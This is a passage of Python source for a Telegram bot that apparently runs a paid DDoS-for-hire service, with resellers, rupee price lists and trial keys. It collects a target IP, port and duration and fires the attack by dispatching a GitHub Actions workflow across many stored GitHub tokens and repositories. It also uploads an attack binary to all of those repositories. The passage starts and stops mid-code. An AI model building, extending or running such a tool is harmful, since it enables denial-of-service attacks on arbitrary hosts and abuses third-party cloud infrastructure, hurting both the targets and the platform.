            "✅ **YOU ALREADY HAVE ACCESS**\n\n"
            "Your account is active!",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    username = query.from_user.username or f"user_{user_id}"
    
    pending.append({
        "user_id": user_id,
        "username": username,
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "first_name": query.from_user.first_name or "Unknown"
    })
    
    save_pending_users(pending)
    
    await query.edit_message_text(
        "✅ **ACCESS REQUEST SENT!**\n\n"
        "Your request has been sent to the owners.\n"
        "You'll be notified once it's approved.\n\n"
        "🆔 Your ID: `" + str(user_id) + "`\n"
        "📅 Date: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )
    
    for owner_id in owners.keys():
        try:
            await context.bot.send_message(
                chat_id=int(owner_id),
                text=f"📢 **NEW ACCESS REQUEST**\n\n"
                     f"👤 User: @{username}\n"
                     f"🆔 ID: `{user_id}`\n"
                     f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                     f"Use /start to view pending requests.",
                parse_mode='Markdown'
            )
        except:
            pass

async def show_statistics(query):
    text = f"""
📊 **BOT STATISTICS**

👥 Total Approved Users: {len(approved_users)}
🛡️ Total Admins: {len(admins)}
💰 Total Resellers: {len(resellers)}
👑 Total Owners: {len(owners)}
🔑 Active Servers: {len(github_tokens)}
📝 Pending Requests: {len(load_pending_users())}

⚙️ **System Status**:
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
⏱️ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}
"""
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_my_account(query, user_id):
    if not is_approved_user(user_id):
        await query.edit_message_text("❌ You don't have an active account.", reply_markup=get_back_keyboard())
        return
    
    user_data = approved_users[str(user_id)]
    expiry = user_data['expiry_date']
    remaining = format_time_remaining(expiry)
    
    text = f"""
📊 **MY ACCOUNT**

👤 Username: @{user_data.get('username', 'Unknown')}
🆔 User ID: `{user_id}`
⏰ Time Left: {remaining}
📅 Expires: {expiry}
👤 Added By: {user_data.get('added_by', 'Unknown')}
📦 Plan: {user_data.get('plan', 'Standard')}
"""
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

logger.info("✅ Part 4: Button handlers loaded")

async def init_attack(query, user_id):
    global current_attack, cooldown_until
    
    if MAINTENANCE_MODE:
        await query.answer("🔧 Maintenance mode is active!", show_alert=True)
        return
    
    if current_attack:
        await query.answer("⚠️ Another attack is already running!", show_alert=True)
        return
    
    if cooldown_until > time.time():
        remaining = int(cooldown_until - time.time())
        await query.answer(f"⏳ Please wait {remaining}s", show_alert=True)
        return
    
    if not github_tokens:
        await query.answer("❌ No servers available!", show_alert=True)
        return
    
    user_states[user_id] = {"state": WAITING_FOR_IP, "data": {}}
    
    await query.edit_message_text(
        "🎯 **START ATTACK**\n\n"
        "Please enter the target IP address:",
        reply_markup=get_cancel_keyboard(),
        parse_mode='Markdown'
    )

async def stop_attack_callback(query, user_id):
    global current_attack
    
    if not current_attack:
        await query.answer("⚠️ No active attack to stop!", show_alert=True)
        return
    
    if not (is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id):
        await query.answer("❌ You can only stop your own attacks!", show_alert=True)
        return
    
    current_attack = None
    save_attack_state()
    
    await query.edit_message_text(
        "✅ **ATTACK STOPPED**\n\n"
        "The current attack has been terminated.",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )

async def launch_attack(target, port, duration, user_id, username, message):
    global current_attack, cooldown_until
    
    current_attack = {
        "target": target,
        "port": port,
        "time": duration,
        "user": username,
        "user_id": user_id,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_attack_state()
    
    if user_id not in user_attack_counts:
        user_attack_counts[user_id] = 0
    user_attack_counts[user_id] += 1
    
    def run_attack(token_data):
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            
            try:
                workflow = repo.get_workflow("main.yml")
                workflow.create_dispatch(
                    ref="main",
                    inputs={
                        "target": target,
                        "port": str(port),
                        "time": str(duration)
                    }
                )
                logger.info(f"Attack launched on {token_data['username']}")
            except Exception as e:
                logger.error(f"Workflow dispatch error on {token_data['username']}: {e}")
        except Exception as e:
            logger.error(f"Attack error on {token_data['username']}: {e}")
    
    threads = []
    for token_data in github_tokens:
        thread = threading.Thread(target=run_attack, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()
    
    await message.reply_text(
        f"✅ **ATTACK LAUNCHED!**\n\n"
        f"🎯 Target: `{target}`\n"
        f"🔌 Port: `{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🔑 Servers: `{len(github_tokens)}`\n\n"
        f"⏳ Cooldown: {COOLDOWN_DURATION}s",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )
    
    import asyncio
    await asyncio.sleep(duration)
    
    if current_attack and current_attack.get('user_id') == user_id:
        current_attack = None
        save_attack_state()

async def approve_request(query, admin_id, req_user_id):
    if not (is_owner(admin_id) or is_admin(admin_id)):
        await query.answer("❌ ACCESS DENIED", show_alert=True)
        return
    
    pending = load_pending_users()
    req_data = None
    
    for req in pending:
        if req['user_id'] == req_user_id:
            req_data = req
            pending.remove(req)
            break
    
    if not req_data:
        await query.answer("❌ Request not found!", show_alert=True)
        return
    
    user_states[admin_id] = {
        "state": WAITING_FOR_DAYS,
        "action": "approve_request",
        "data": {"user_id": req_user_id, "username": req_data.get('username')}
    }
    
    save_pending_users(pending)
    
    await query.edit_message_text(
        f"✅ **APPROVING REQUEST**\n\n"
        f"👤 User: @{req_data.get('username')}\n"
        f"🆔 ID: `{req_user_id}`\n\n"
        f"Enter the number of days for access:",
        reply_markup=get_cancel_keyboard(),
        parse_mode='Markdown'
    )

async def reject_request(query, admin_id, req_user_id):
    if not (is_owner(admin_id) or is_admin(admin_id)):
        await query.answer("❌ ACCESS DENIED", show_alert=True)
        return
    
    pending = load_pending_users()
    req_data = None
    
    for req in pending:
        if req['user_id'] == req_user_id:
            req_data = req
            pending.remove(req)
            break
    
    if not req_data:
        await query.answer("❌ Request not found!", show_alert=True)
        return
    
    save_pending_users(pending)
    
    await query.edit_message_text(
        f"❌ **REQUEST REJECTED**\n\n"
        f"👤 User: @{req_data.get('username')}\n"
        f"🆔 ID: `{req_user_id}`\n\n"
        f"The request has been rejected.",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )

async def init_add_user(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_USER_ID, "action": "add", "data": {}}
    
    await query.edit_message_text(
        "➕ **ADD USER**\n\n"
        "Please enter the User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def init_remove_user(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_REMOVE_ID, "action": "remove"}
    
    await query.edit_message_text(
        "➖ **REMOVE USER**\n\n"
        "Please enter the User ID to remove:",
        reply_markup=get_cancel_keyboard()
    )

async def show_users_list(query):
    if not approved_users:
        text = "📭 No approved users yet."
    else:
        text = "👥 **APPROVED USERS LIST**\n\n"
        for i, (uid, data) in enumerate(list(approved_users.items())[:20], 1):
            username = data.get('username', 'Unknown')
            expiry = data.get('expiry_date', 'N/A')
            remaining = format_time_remaining(expiry)
            text += f"{i}. @{username}\n"
            text += f"   🆔 {uid}\n"
            text += f"   ⏰ {remaining}\n\n"
        
        if len(approved_users) > 20:
            text += f"\n... and {len(approved_users) - 20} more users"
        
        text += f"\n📊 Total Users: {len(approved_users)}"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def init_add_server(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_TOKEN}
    
    await query.edit_message_text(
        "➕ **ADD SERVER**\n\n"
        "Please send your GitHub Personal Access Token:",
        reply_markup=get_cancel_keyboard()
    )

async def init_remove_server(query, user_id):
    if not github_tokens:
        await query.edit_message_text(
            "📭 No servers to remove.",
            reply_markup=get_back_keyboard()
        )
        return
    
    text = "🔑 **SELECT SERVER TO REMOVE**\n\n"
    for i, token_data in enumerate(github_tokens, 1):
        text += f"{i}. {token_data['username']} - {token_data['repo']}\n"
    
    text += "\nReply with the server number:"
    
    user_states[user_id] = {"state": "select_server_remove"}
    
    await query.edit_message_text(text, reply_markup=get_cancel_keyboard())

async def show_servers_list(query):
    if not github_tokens:
        text = "📭 No servers added yet."
    else:
        text = "🔑 **SERVERS LIST**\n\n"
        for i, token_data in enumerate(github_tokens, 1):
            text += f"{i}. 👤 {token_data['username']}\n"
            text += f"   📁 {token_data['repo']}\n"
            text += f"   📅 {token_data.get('added_date', 'N/A')}\n\n"
        
        text += f"📊 Total Servers: {len(github_tokens)}"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def init_upload_binary(query, user_id):
    if not github_tokens:
        await query.edit_message_text(
            "❌ No servers available!\n\nAdd servers first.",
            reply_markup=get_back_keyboard()
        )
        return
    
    user_states[user_id] = {"state": WAITING_FOR_BINARY}
    
    await query.edit_message_text(
        "📤 **UPLOAD BINARY**\n\n"
        "Please send your binary file.\n"
        f"It will be uploaded as '{BINARY_FILE_NAME}' to all servers.",
        reply_markup=get_cancel_keyboard()
    )

async def init_set_cooldown(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_COOLDOWN}
    
    await query.edit_message_text(
        f"⏱️ **SET COOLDOWN**\n\n"
        f"Current: {COOLDOWN_DURATION}s\n\n"
        "Enter new cooldown duration (in seconds):",
        reply_markup=get_cancel_keyboard()
    )

async def init_set_max_attacks(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_MAX_ATTACKS}
    
    await query.edit_message_text(
        f"🎯 **SET MAX ATTACKS**\n\n"
        f"Current: {MAX_ATTACKS}\n\n"
        "Enter new max attacks limit:",
        reply_markup=get_cancel_keyboard()
    )

async def toggle_maintenance(query, user_id):
    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)
    
    status = "ON ✅" if MAINTENANCE_MODE else "OFF ❌"
    await query.answer(f"Maintenance mode: {status}", show_alert=True)
    await show_settings(query)

async def init_gen_trial_key(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_TRIAL_HOURS}
    
    await query.edit_message_text(
        "🎁 **GENERATE TRIAL KEY**\n\n"
        "Enter the number of hours for the trial key:",
        reply_markup=get_cancel_keyboard()
    )

async def init_redeem_key(query, user_id):
    user_states[user_id] = {"state": WAITING_FOR_REDEEM_KEY}
    
    await query.edit_message_text(
        "🎁 **REDEEM TRIAL KEY**\n\n"
        "Please enter your trial key:",
        reply_markup=get_cancel_keyboard()
    )

async def start_broadcast(query, user_id):
    if not is_owner(user_id):
        await query.answer("❌ ACCESS DENIED", show_alert=True)
        return
    
    user_states[user_id] = {"state": WAITING_FOR_BROADCAST}
    
    await query.edit_message_text(
        "📢 **BROADCAST MESSAGE**\n\n"
        "Send the message you want to broadcast to all users:",
        reply_markup=get_cancel_keyboard()
    )

async def init_add_admin(query, user_id):
    user_states[user_id] = {"state": "add_admin_id"}
    
    await query.edit_message_text(
        "➕ **ADD ADMIN**\n\n"
        "Enter the User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def init_remove_admin(query, user_id):
    user_states[user_id] = {"state": "remove_admin_id"}
    
    await query.edit_message_text(
        "➖ **REMOVE ADMIN**\n\n"
        "Enter the Admin ID to remove:",
        reply_markup=get_cancel_keyboard()
    )

async def show_admins_list(query):
    if not admins:
        text = "📭 No admins added yet."
    else:
        text = "🛡️ **ADMINS LIST**\n\n"
        for i, (admin_id, data) in enumerate(admins.items(), 1):
            text += f"{i}. @{data.get('username', 'Unknown')}\n"
            text += f"   🆔 {admin_id}\n"
            text += f"   📅 {data.get('added_date', 'N/A')}\n\n"
        
        text += f"📊 Total Admins: {len(admins)}"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def init_add_reseller(query, user_id):
    user_states[user_id] = {"state": "add_reseller_id"}
    
    await query.edit_message_text(
        "➕ **ADD RESELLER**\n\n"
        "Enter the User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def init_remove_reseller(query, user_id):
    user_states[user_id] = {"state": "remove_reseller_id"}
    
    await query.edit_message_text(
        "➖ **REMOVE RESELLER**\n\n"
        "Enter the Reseller ID to remove:",
        reply_markup=get_cancel_keyboard()
    )

async def init_add_reseller_credits(query, user_id):
    user_states[user_id] = {"state": "add_credits_id"}
    
    await query.edit_message_text(
        "💳 **ADD RESELLER CREDITS**\n\n"
        "Enter the Reseller ID:",
        reply_markup=get_cancel_keyboard()
    )

async def show_resellers_list(query):
    if not resellers:
        text = "📭 No resellers added yet."
    else:
        text = "💰 **RESELLERS LIST**\n\n"
        for i, (res_id, data) in enumerate(resellers.items(), 1):
            text += f"{i}. @{data.get('username', 'Unknown')}\n"
            text += f"   🆔 {res_id}\n"
            text += f"   💳 Credits: {data.get('credits', 0)} days\n\n"
        
        text += f"📊 Total Resellers: {len(resellers)}"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def init_reseller_add_user(query, user_id):
    user_states[user_id] = {"state": "reseller_add_user_id"}
    
    await query.edit_message_text(
        "➕ **ADD USER**\n\n"
        "Enter the User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def init_reseller_remove_user(query, user_id):
    user_states[user_id] = {"state": "reseller_remove_user_id"}
    
    await query.edit_message_text(
        "➖ **REMOVE USER**\n\n"
        "Enter the User ID to remove:",
        reply_markup=get_cancel_keyboard()
    )

async def show_reseller_users(query, user_id):
    reseller_users = [uid for uid, data in approved_users.items() if data.get('added_by') == str(user_id)]
    
    if not reseller_users:
        text = "📭 You haven't added any users yet."
    else:
        text = "👥 **YOUR USERS**\n\n"
        for i, uid in enumerate(reseller_users[:20], 1):
            data = approved_users[uid]
            username = data.get('username', 'Unknown')
            remaining = format_time_remaining(data['expiry_date'])
            text += f"{i}. @{username}\n"
            text += f"   🆔 {uid}\n"
            text += f"   ⏰ {remaining}\n\n"
        
        if len(reseller_users) > 20:
            text += f"\n... and {len(reseller_users) - 20} more"
        
        text += f"\n📊 Total Users: {len(reseller_users)}"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_credits(query, user_id):
    reseller_data = resellers[str(user_id)]
    credits = reseller_data.get('credits', 0)
    
    text = f"""
💳 **YOUR CREDITS**

💰 Available Credits: {credits} days
👥 Users Added: {reseller_data.get('users_added', 0)}
📅 Member Since: {reseller_data.get('added_date', 'N/A')}

💡 Use credits to add new users!
"""
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_prices(query):
    text = "💰 **RESELLER PRICE LIST**\n\n"
    
    for days, price in USER_PRICES.items():
        text += f"📅 {days} {'day' if days == '1' else 'days'}: ₹{price}\n"
    
    text += "\n💡 Contact the owner to purchase!"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

logger.info("✅ Part 5: Action handlers loaded")
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id not in user_states or user_states[user_id] is None:
        return
    
    state_info = user_states[user_id]
    state = state_info.get("state")
    
    if state == WAITING_FOR_IP:
        user_states[user_id]["data"]["ip"] = text
        user_states[user_id]["state"] = WAITING_FOR_PORT
        await update.message.reply_text(
            "🔌 **ENTER PORT**\n\nPlease enter the port number:",
            reply_markup=get_cancel_keyboard()
        )
    
    elif state == WAITING_FOR_PORT:
        try:
            port = int(text)
            if port < 1 or port > 65535:
                await update.message.reply_text("⚠️ Invalid port! Must be 1-65535\n\nEnter PORT:", reply_markup=get_cancel_keyboard())
                return
            
            user_states[user_id]["data"]["port"] = port
            user_states[user_id]["state"] = WAITING_FOR_TIME
            await update.message.reply_text(
                "⏱️ **ENTER DURATION**\n\nPlease enter attack duration (seconds):",
                reply_markup=get_cancel_keyboard()
            )
        except ValueError:
            await update.message.reply_text("⚠️ Invalid port number!\n\nEnter PORT:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_TIME:
        try:
            duration = int(text)
            if duration < 10 or duration > 3600:
                await update.message.reply_text("⚠️ Duration must be 10-3600 seconds!\n\nEnter DURATION:", reply_markup=get_cancel_keyboard())
                return
            
            target = user_states[user_id]["data"]["ip"]
            port = user_states[user_id]["data"]["port"]
            username = update.effective_user.username or f"user_{user_id}"
            
            user_states[user_id] = None
            
            await launch_attack(target, port, duration, user_id, username, update.message)
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid duration!\n\nEnter DURATION:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_USER_ID:
        try:
            target_user_id = int(text)
            user_states[user_id]["data"]["target_id"] = target_user_id
            user_states[user_id]["state"] = WAITING_FOR_DAYS
            await update.message.reply_text(
                f"📅 **ENTER DAYS**\n\nHow many days of access for user {target_user_id}?",
                reply_markup=get_cancel_keyboard()
            )
        except ValueError:
            await update.message.reply_text("⚠️ Invalid User ID!\n\nEnter USER ID:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_DAYS:
        try:
            days = int(text)
            if days < 1:
                await update.message.reply_text("⚠️ Days must be at least 1!\n\nEnter DAYS:", reply_markup=get_cancel_keyboard())
                return
            
            action = state_info.get("action")
            
            if action == "approve_request":
                target_user_id = state_info["data"]["user_id"]
                username = state_info["data"]["username"]
            else:
                target_user_id = state_info["data"]["target_id"]
                username = f"user_{target_user_id}"
            
            expiry = datetime.now() + timedelta(days=days)
            
            approved_users[str(target_user_id)] = {
                "username": username,
                "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
                "added_by": str(user_id),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "plan": f"{days} days"
            }
            
            save_approved_users(approved_users)
            user_states[user_id] = None
            
            await update.message.reply_text(
                f"✅ **USER ADDED!**\n\n"
                f"👤 User: {target_user_id}\n"
                f"📅 Days: {days}\n"
                f"⏰ Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}",
                reply_markup=get_back_keyboard()
            )
            
            if action == "approve_request":
                try:
                    await context.bot.send_message(
                        chat_id=target_user_id,
                        text=f"✅ **ACCESS APPROVED!**\n\n"
                             f"Your access request has been approved!\n"
                             f"⏰ Valid for: {days} days\n"
                             f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                             f"Use /start to begin!",
                        parse_mode='Markdown'
                    )
                except:
                    pass
        
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!\n\nEnter DAYS:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_REMOVE_ID:
        try:
            target_user_id = str(int(text))
            
            if target_user_id not in approved_users:
                await update.message.reply_text("❌ User not found!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            username = approved_users[target_user_id].get('username', 'Unknown')
            del approved_users[target_user_id]
            save_approved_users(approved_users)
            
            await update.message.reply_text(
                f"✅ **USER REMOVED!**\n\n"
                f"👤 User: @{username}\n"
                f"🆔 ID: {target_user_id}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid User ID!", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_TOKEN:
        token = text.strip()
        repo_name = "soulcrack-tg"
        
        try:
            for existing_token in github_tokens:
                if existing_token['token'] == token:
                    await update.message.reply_text("❌ Token already exists!", reply_markup=get_back_keyboard())
                    user_states[user_id] = None
                    return
            
            g = Github(token)
            user = g.get_user()
            username = user.login
            
            repo, created = create_repository(token, repo_name)
            
            new_token_data = {
                'token': token,
                'username': username,
                'repo': f"{username}/{repo_name}",
                'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'active'
            }
            
            github_tokens.append(new_token_data)
            save_github_tokens(github_tokens)
            
            status = "NEW REPO CREATED" if created else "EXISTING REPO USED"
            
            await update.message.reply_text(
                f"✅ **{status} & TOKEN ADDED!**\n\n"
                f"👤 Username: {username}\n"
                f"📁 Repo: {repo_name}\n"
                f"📊 Total servers: {len(github_tokens)}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ **ERROR**\n\n{str(e)}\n\nPlease check the token.",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
    
    elif state == "select_server_remove":
        try:
            server_num = int(text)
            if server_num < 1 or server_num > len(github_tokens):
                await update.message.reply_text(f"❌ Invalid number! Use 1-{len(github_tokens)}", reply_markup=get_cancel_keyboard())
                return
            
            removed_token = github_tokens.pop(server_num - 1)
            save_github_tokens(github_tokens)
            
            await update.message.reply_text(
                f"✅ **SERVER REMOVED!**\n\n"
                f"👤 Server: {removed_token['username']}\n"
                f"📁 Repo: {removed_token['repo']}\n"
                f"📊 Remaining: {len(github_tokens)}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_COOLDOWN:
        try:
            global COOLDOWN_DURATION
            new_cooldown = int(text)
            if new_cooldown < 10:
                await update.message.reply_text("⚠️ Minimum cooldown is 10 seconds!\n\nEnter COOLDOWN:", reply_markup=get_cancel_keyboard())
                return
            
            COOLDOWN_DURATION = new_cooldown
            save_cooldown(new_cooldown)
            
            await update.message.reply_text(
                f"✅ **COOLDOWN UPDATED!**\n\n"
                f"New cooldown: {COOLDOWN_DURATION}s",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!\n\nEnter COOLDOWN:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_MAX_ATTACKS:
        try:
            global MAX_ATTACKS
            max_attacks = int(text)
            if max_attacks < 1 or max_attacks > 1000:
                await update.message.reply_text("⚠️ Must be 1-1000!\n\nEnter MAX ATTACKS:", reply_markup=get_cancel_keyboard())
                return
            
            MAX_ATTACKS = max_attacks
            save_max_attacks(max_attacks)
            
            await update.message.reply_text(
                f"✅ **MAX ATTACKS UPDATED!**\n\n"
                f"New limit: {MAX_ATTACKS}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!\n\nEnter MAX ATTACKS:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_TRIAL_HOURS:
        try:
            hours = int(text)
            if hours < 1 or hours > 720:
                await update.message.reply_text("⚠️ Hours must be 1-720!\n\nEnter HOURS:", reply_markup=get_cancel_keyboard())
                return
            
            key = generate_trial_key(hours)
            
            await update.message.reply_text(
                f"✅ **TRIAL KEY GENERATED!**\n\n"
                f"🎁 Key: `{key}`\n"
                f"⏱️ Duration: {hours} hours\n\n"
                f"Share this key with users to give them trial access!",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!\n\nEnter HOURS:", reply_markup=get_cancel_keyboard())
    
    elif state == WAITING_FOR_REDEEM_KEY:
        key = text.upper()
        
        if key not in trial_keys:
            await update.message.reply_text("❌ Invalid trial key!", reply_markup=get_back_keyboard())
            user_states[user_id] = None
            return
        
        key_data = trial_keys[key]
        
        if key_data.get('used'):
            await update.message.reply_text("❌ This key has already been used!", reply_markup=get_back_keyboard())
            user_states[user_id] = None
            return
        
        expiry = datetime.strptime(key_data['expiry'], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiry:
            await update.message.reply_text("❌ This key has expired!", reply_markup=get_back_keyboard())
            user_states[user_id] = None
            return
        
        hours = key_data['hours']
        new_expiry = datetime.now() + timedelta(hours=hours)
        
        approved_users[str(user_id)] = {
            "username": update.effective_user.username or f"user_{user_id}",
            "expiry_date": new_expiry.strftime("%Y-%m-%d %H:%M:%S"),
            "added_by": "trial_key",
            "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "plan": f"{hours}h trial"
        }
        
        trial_keys[key]['used'] = True
        trial_keys[key]['used_by'] = user_id
        trial_keys[key]['used_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        save_approved_users(approved_users)
        save_trial_keys(trial_keys)
        
        await update.message.reply_text(
            f"✅ **TRIAL KEY ACTIVATED!**\n\n"
            f"🎁 Duration: {hours} hours\n"
            f"⏰ Valid Until: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"You now have access! Use /start to begin.",
            reply_markup=get_back_keyboard()
        )
        user_states[user_id] = None
    
    elif state == WAITING_FOR_BROADCAST:
        if not is_owner(user_id):
            return
        
        broadcast_text = text
        success = 0
        failed = 0
        
        for target_id in approved_users.keys():
            try:
                await context.bot.send_message(
                    chat_id=int(target_id),
                    text=f"📢 **BROADCAST MESSAGE**\n\n{broadcast_text}",
                    parse_mode='Markdown'
                )
                success += 1
            except:
                failed += 1
        
        await update.message.reply_text(
            f"✅ **BROADCAST COMPLETED!**\n\n"
            f"✅ Sent: {success}\n"
            f"❌ Failed: {failed}\n"
            f"📊 Total: {len(approved_users)}",
            reply_markup=get_back_keyboard()
        )
        user_states[user_id] = None
    
    elif state == "add_admin_id":
        try:
            admin_id = str(int(text))
            
            if admin_id in admins:
                await update.message.reply_text("⚠️ Already an admin!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            admins[admin_id] = {
                "username": f"admin_{admin_id}",
                "added_by": str(user_id),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            save_admins(admins)
            
            await update.message.reply_text(
                f"✅ **ADMIN ADDED!**\n\n"
                f"🆔 ID: {admin_id}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    elif state == "remove_admin_id":
        try:
            admin_id = str(int(text))
            
            if admin_id not in admins:
                await update.message.reply_text("❌ Admin not found!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            del admins[admin_id]
            save_admins(admins)
            
            await update.message.reply_text(
                f"✅ **ADMIN REMOVED!**\n\n"
                f"🆔 ID: {admin_id}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    elif state == "add_reseller_id":
        try:
            reseller_id = str(int(text))
            
            if reseller_id in resellers:
                await update.message.reply_text("⚠️ Already a reseller!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            user_states[user_id]["data"]["reseller_id"] = reseller_id
            user_states[user_id]["state"] = "add_reseller_credits"
            
            await update.message.reply_text(
                "💳 **ENTER CREDITS**\n\nHow many days of credits?",
                reply_markup=get_cancel_keyboard()
            )
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    elif state == "add_reseller_credits":
        try:
            credits = int(text)
            if credits < 1:
                await update.message.reply_text("⚠️ Credits must be at least 1!", reply_markup=get_cancel_keyboard())
                return
            
            reseller_id = state_info["data"]["reseller_id"]
            
            resellers[reseller_id] = {
                "username": f"reseller_{reseller_id}",
                "credits": credits,
                "added_by": str(user_id),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "users_added": 0
            }
            
            save_resellers(resellers)
            
            await update.message.reply_text(
                f"✅ **RESELLER ADDED!**\n\n"
                f"🆔 ID: {reseller_id}\n"
                f"💳 Credits: {credits} days",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
    
    elif state == "remove_reseller_id":
        try:
            reseller_id = str(int(text))
            
            if reseller_id not in resellers:
                await update.message.reply_text("❌ Reseller not found!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            del resellers[reseller_id]
            save_resellers(resellers)
            
            await update.message.reply_text(
                f"✅ **RESELLER REMOVED!**\n\n"
                f"🆔 ID: {reseller_id}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    elif state == "add_credits_id":
        try:
            reseller_id = str(int(text))
            
            if reseller_id not in resellers:
                await update.message.reply_text("❌ Reseller not found!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            user_states[user_id]["data"]["reseller_id"] = reseller_id
            user_states[user_id]["state"] = "add_credits_amount"
            
            await update.message.reply_text(
                f"💳 **ADD CREDITS**\n\nCurrent: {resellers[reseller_id].get('credits', 0)} days\n\nHow many days to add?",
                reply_markup=get_cancel_keyboard()
            )
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    elif state == "add_credits_amount":
        try:
            credits = int(text)
            if credits < 1:
                await update.message.reply_text("⚠️ Credits must be at least 1!", reply_markup=get_cancel_keyboard())
                return
            
            reseller_id = state_info["data"]["reseller_id"]
            resellers[reseller_id]["credits"] = resellers[reseller_id].get("credits", 0) + credits
            save_resellers(resellers)
